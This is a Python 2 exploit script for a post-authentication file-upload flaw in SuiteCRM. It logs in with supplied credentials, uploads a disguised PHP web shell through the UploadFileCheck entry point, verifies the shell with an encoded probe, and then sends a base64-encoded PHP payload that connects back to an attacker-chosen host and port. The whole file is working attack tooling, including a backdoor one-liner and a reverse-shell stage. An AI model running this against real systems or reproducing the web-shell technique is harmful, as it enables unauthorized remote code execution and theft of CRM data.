#!/usr/bin/python2
# coding: utf-8
# Author: Darren Martyn, Xiphos Research Ltd.
# Version: 20150512.1
# Licence: WTFPL - wtfpl.net
import requests
import sys
__version__ = "20150512.1"

def banner():
    print """\x1b[1;32m
███████╗██╗   ██╗██╗████████╗███████╗███████╗██╗  ██╗███████╗██╗     ██╗     
██╔════╝██║   ██║██║╚══██╔══╝██╔════╝██╔════╝██║  ██║██╔════╝██║     ██║     
███████╗██║   ██║██║   ██║   █████╗  ███████╗███████║█████╗  ██║     ██║     
╚════██║██║   ██║██║   ██║   ██╔══╝  ╚════██║██╔══██║██╔══╝  ██║     ██║     
███████║╚██████╔╝██║   ██║   ███████╗███████║██║  ██║███████╗███████╗███████╗
╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
Exploit for SuiteCRM Post-Auth Shell Upload Version: %s\x1b[0m""" %(__version__)


def upload_shell(base_url, username, password):
    url = base_url + "index.php"
    s = requests.Session()
    data = {'module': 'Users',
            'action': 'Authenticate',
            'return_module': 'Users',
            'return_action': 'Login',
            'cant_login': '',
            'login_module': '',
            'login_action': '',
            'login_record': '',
            'login_token': '',
            'login_oauth_token': '',
            'login_mobile': '',
            'login_language': 'en_us',
            'user_name': username,
            'user_password': password,
            'Login': 'Log In'}
    print "\x1b[1;32m{+} Logging into the CRM...\x1b[0m"
    try:
        r = s.post(url=url, data=data)
    except Exception, e:
        sys.exit("\x1b[1;31m{-} Something failed. Stacktrace coming...\n\x1b[0m %s" %(str(e)))
    if r.status_code == 200:
        pass
    else:
        sys.exit("\x1b[1;31m{-} Something went wrong...\x1b[0")
    files={"file_1":("suiteshell.phtml", "<?php @assert(filter_input(0,woot,516)); ?>")}
    data = {'entryPoint': 'UploadFileCheck',
            'forQuotes': 'false'}
    print "\x1b[1;32m{+} Uploading our shell...\x1b[0m"
    try:
        r = s.post(url=url, data=data, files=files)
    except Exception, e:
        sys.exit("\x1b[1;31m{-} Something failed. Bollocks. Stacktrace coming...\n\x1b0m %s" %(str(e)))
    if r.status_code == 200:
        pass
    else:
        sys.exit("\x1b[1;31m{-} Something went wrong...\x1b[0m")
    shell_url = base_url + "upload/tmp_logo_company_upload/suiteshell.phtml"
    print "\x1b[1;32m{+} Probing for our shell...\x1b[0m"
    try:
        r = s.post(url=shell_url, data={"woot": "eval(base64_decode('ZWNobyBtZDUoJ3B3bmVkJyk7'))"})
    except Exception, e:
        sys.exit("\x1b[1;31m{-} Could not connect to shell... printing backtrace...\n\x1b[0m %s" %(str(e)))
    if "5e93de3efa544e85dcd6311732d28f95" in r.text:
        print "\x1b[1;32m{+} Shell located and functioning at %s\x1b[0m" %(shell_url)
        return shell_url
    else:
        sys.exit("\x1b[1;31m{-} Could get response from the shell. Bailing...\x1b[0m")

def php_encoder(php):
    f = open(php, "r").read()
    f = f.replace("<?php", "")
    f = f.replace("?>", "")
    encoded = f.encode('base64')
    encoded = encoded.replace("\n", "")
    encoded = encoded.strip()
    code = "eval(base64_decode('%s'));" %(encoded)
    return code

def spawn_backconnect(shell_url, payload, cb_host, cb_port):
    cookies = {'host': cb_host, 'port': cb_port}
    data = {'woot': payload}
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
    try:
        print "\x1b[1;32m{*} Sending our payload...\x1b[0m"
        r = requests.post(url=shell_url, data=data, headers=headers, verify=False, cookies=cookies)
    except Exception, e:
        sys.exit("\x1b[1;31m{-} Exception hit, printing stack trace...\n%s\x1b[0m" %(str(e)))
    if r.text:
        print r.text

def main(args):
    banner()
    if len(args) != 7:
        sys.exit("usage: %s <base url> <username> <password> <payload> <connectback host> <connectback port>" %(args[0]))
    shell_url = upload_shell(base_url=args[1], username=args[2], password=args[3])
    spawn_backconnect(shell_url, payload=php_encoder(args[4]), cb_host=args[5], cb_port=args[6])

if __name__ == "__main__":
    main(args=sys.argv)
